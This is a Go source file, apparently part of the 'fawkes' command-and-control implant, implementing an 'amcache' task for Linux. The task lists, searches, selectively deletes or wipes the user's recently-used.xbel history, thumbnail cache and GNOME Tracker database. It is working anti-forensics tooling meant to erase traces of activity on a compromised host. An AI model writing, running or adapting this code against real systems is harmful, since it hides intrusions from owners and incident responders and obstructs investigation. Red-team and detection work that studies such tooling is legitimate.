//go:build linux

package commands

import (
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// AmcacheCommand implements forensic artifact management on Linux.
// Targets: recently-used.xbel (GTK/GNOME), thumbnail cache, GNOME Tracker database.
type AmcacheCommand struct{}

func (c *AmcacheCommand) Name() string { return "amcache" }
func (c *AmcacheCommand) Description() string {
	return "Query and clean Linux forensic artifacts (recently-used, thumbnails, tracker)"
}

type amcacheParams struct {
	Action string `json:"action"`
	Name   string `json:"name"`
	Count  int    `json:"count"`
}

type amcacheOutputEntry struct {
	Index        int    `json:"index"`
	LastModified string `json:"last_modified"`
	Path         string `json:"path"`
}

// xbelDoc represents the XBEL recently-used file format
type xbelDoc struct {
	XMLName   xml.Name       `xml:"xbel"`
	Version   string         `xml:"version,attr,omitempty"`
	Bookmarks []xbelBookmark `xml:"bookmark"`
}

// xbelBookmark represents a single recently-used entry
type xbelBookmark struct {
	XMLName  xml.Name `xml:"bookmark"`
	Href     string   `xml:"href,attr"`
	Added    string   `xml:"added,attr,omitempty"`
	Modified string   `xml:"modified,attr,omitempty"`
	Visited  string   `xml:"visited,attr,omitempty"`
	Inner    string   `xml:",innerxml"`
}

func (c *AmcacheCommand) Execute(task structs.Task) structs.CommandResult {
	var params amcacheParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "query"
	}
	if params.Count == 0 {
		params.Count = 50
	}

	switch params.Action {
	case "query":
		return amcacheQuery(params)
	case "search":
		return amcacheSearch(params)
	case "delete":
		return amcacheDelete(params)
	case "clear":
		return amcacheClear()
	default:
		return errorf("Unknown action: %s (use query, search, delete, or clear)", params.Action)
	}
}

// getRecentlyUsedPath returns the path to the recently-used.xbel file.
func getRecentlyUsedPath() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return ""
	}
	// XDG standard location
	xdgPath := filepath.Join(home, ".local", "share", "recently-used.xbel")
	if _, err := os.Stat(xdgPath); err == nil {
		return xdgPath
	}
	// Legacy location
	legacyPath := filepath.Join(home, ".recently-used.xbel")
	if _, err := os.Stat(legacyPath); err == nil {
		return legacyPath
	}
	return xdgPath // default to XDG even if doesn't exist
}

// getArtifactPaths returns paths to additional forensic artifact directories.
func getArtifactPaths() (thumbnails, tracker string) {
	home, _ := os.UserHomeDir()
	if home == "" {
		return "", ""
	}
	thumbnails = filepath.Join(home, ".cache", "thumbnails")
	// Check for Tracker 3.x first, then 2.x
	tracker3 := filepath.Join(home, ".cache", "tracker3")
	if _, err := os.Stat(tracker3); err == nil {
		return thumbnails, tracker3
	}
	tracker2 := filepath.Join(home, ".local", "share", "tracker")
	return thumbnails, tracker2
}

// parseRecentlyUsed reads and parses the recently-used.xbel file.
func parseRecentlyUsed(path string) (*xbelDoc, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	defer structs.ZeroBytes(data)

	var doc xbelDoc
	if err := xml.Unmarshal(data, &doc); err != nil {
		return nil, fmt.Errorf("parse XBEL: %w", err)
	}
	return &doc, nil
}

// dirArtifactStats returns file count and total size of a directory.
func dirArtifactStats(path string) (int, int64) {
	var count int
	var size int64
	_ = filepath.WalkDir(path, func(_ string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if info, infoErr := d.Info(); infoErr == nil {
			count++
			size += info.Size()
		}
		return nil
	})
	return count, size
}

// xbelPathFromHref extracts a filesystem path from a file:// URI.
func xbelPathFromHref(href string) string {
	if strings.HasPrefix(href, "file://") {
		return strings.TrimPrefix(href, "file://")
	}
	return href
}

// xbelTimestamp extracts and formats the most relevant timestamp from a bookmark.
func xbelTimestamp(b xbelBookmark) string {
	ts := b.Modified
	if ts == "" {
		ts = b.Added
	}
	if t, err := time.Parse(time.RFC3339, ts); err == nil {
		return t.Format("2006-01-02 15:04:05")
	}
	return ts
}

func amcacheQuery(params amcacheParams) structs.CommandResult {
	var output []amcacheOutputEntry

	// Parse recently-used.xbel
	recentPath := getRecentlyUsedPath()
	if doc, err := parseRecentlyUsed(recentPath); err == nil {
		count := params.Count
		if count > len(doc.Bookmarks) {
			count = len(doc.Bookmarks)
		}
		for i := 0; i < count; i++ {
			b := doc.Bookmarks[i]
			output = append(output, amcacheOutputEntry{
				Index:        i + 1,
				LastModified: xbelTimestamp(b),
				Path:         xbelPathFromHref(b.Href),
			})
		}
	}

	// Add artifact summary entries for thumbnails and tracker
	thumbnails, tracker := getArtifactPaths()
	if count, size := dirArtifactStats(thumbnails); count > 0 {
		output = append(output, amcacheOutputEntry{
			Index:        len(output) + 1,
			LastModified: fmt.Sprintf("%d files, %s", count, formatFileSize(size)),
			Path:         fmt.Sprintf("[Thumbnail Cache] %s", thumbnails),
		})
	}
	if count, size := dirArtifactStats(tracker); count > 0 {
		output = append(output, amcacheOutputEntry{
			Index:        len(output) + 1,
			LastModified: fmt.Sprintf("%d files, %s", count, formatFileSize(size)),
			Path:         fmt.Sprintf("[Tracker DB] %s", tracker),
		})
	}

	if len(output) == 0 {
		return successResult("[]")
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}
	return successResult(string(jsonBytes))
}

func amcacheSearch(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for search")
	}

	recentPath := getRecentlyUsedPath()
	doc, err := parseRecentlyUsed(recentPath)
	if err != nil {
		return errorf("Error reading recently-used.xbel: %v", err)
	}

	searchLower := strings.ToLower(params.Name)
	var output []amcacheOutputEntry

	for i, b := range doc.Bookmarks {
		path := xbelPathFromHref(b.Href)
		if strings.Contains(strings.ToLower(path), searchLower) {
			output = append(output, amcacheOutputEntry{
				Index:        i + 1,
				LastModified: xbelTimestamp(b),
				Path:         path,
			})
		}
	}

	if output == nil {
		output = []amcacheOutputEntry{}
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}
	return successResult(string(jsonBytes))
}

func amcacheDelete(params amcacheParams) structs.CommandResult {
	if params.Name == "" {
		return errorResult("Error: -name parameter required for delete")
	}

	recentPath := getRecentlyUsedPath()
	doc, err := parseRecentlyUsed(recentPath)
	if err != nil {
		return errorf("Error reading recently-used.xbel: %v", err)
	}

	searchLower := strings.ToLower(params.Name)
	var keepBookmarks []xbelBookmark
	removed := 0

	for _, b := range doc.Bookmarks {
		path := xbelPathFromHref(b.Href)
		if strings.Contains(strings.ToLower(path), searchLower) {
			removed++
		} else {
			keepBookmarks = append(keepBookmarks, b)
		}
	}

	if removed == 0 {
		return successf("No entries matching \"%s\" found in recently-used.xbel", params.Name)
	}

	doc.Bookmarks = keepBookmarks
	if err := writeRecentlyUsed(recentPath, doc); err != nil {
		return errorf("Error writing recently-used.xbel: %v", err)
	}

	return successf("Removed %d entries matching \"%s\" from recently-used.xbel (%d remaining)",
		removed, params.Name, len(keepBookmarks))
}

func amcacheClear() structs.CommandResult {
	var sb strings.Builder
	totalCleared := 0

	// Clear recently-used.xbel
	recentPath := getRecentlyUsedPath()
	if doc, err := parseRecentlyUsed(recentPath); err == nil {
		count := len(doc.Bookmarks)
		if count > 0 {
			doc.Bookmarks = nil
			if err := writeRecentlyUsed(recentPath, doc); err == nil {
				sb.WriteString(fmt.Sprintf("[OK] Cleared %d entries from %s\n", count, recentPath))
				totalCleared += count
			} else {
				sb.WriteString(fmt.Sprintf("[FAIL] %s: %v\n", recentPath, err))
			}
		}
	}

	// Clear thumbnail cache
	thumbnails, tracker := getArtifactPaths()
	if count, _ := dirArtifactStats(thumbnails); count > 0 {
		if err := clearArtifactDirectory(thumbnails); err == nil {
			sb.WriteString(fmt.Sprintf("[OK] Cleared %d thumbnail files from %s\n", count, thumbnails))
			totalCleared += count
		} else {
			sb.WriteString(fmt.Sprintf("[FAIL] %s: %v\n", thumbnails, err))
		}
	}

	// Clear tracker database
	if count, _ := dirArtifactStats(tracker); count > 0 {
		if err := clearArtifactDirectory(tracker); err == nil {
			sb.WriteString(fmt.Sprintf("[OK] Cleared %d tracker files from %s\n", count, tracker))
			totalCleared += count
		} else {
			sb.WriteString(fmt.Sprintf("[FAIL] %s: %v\n", tracker, err))
		}
	}

	if totalCleared == 0 {
		return successResult("No forensic artifacts found to clear")
	}

	sb.WriteString(fmt.Sprintf("\n[Total: %d artifacts cleared]", totalCleared))
	return successResult(sb.String())
}

// writeRecentlyUsed writes the XBEL document back to disk.
func writeRecentlyUsed(path string, doc *xbelDoc) error {
	if doc.Version == "" {
		doc.Version = "1.0"
	}
	data, err := xml.MarshalIndent(doc, "", "  ")
	if err != nil {
		return err
	}
	content := append([]byte(xml.Header), data...)
	content = append(content, '\n')
	return os.WriteFile(path, content, 0600)
}

// clearArtifactDirectory removes all files in a directory but preserves the directory structure.
func clearArtifactDirectory(path string) error {
	return filepath.WalkDir(path, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		return os.Remove(p)
	})
}
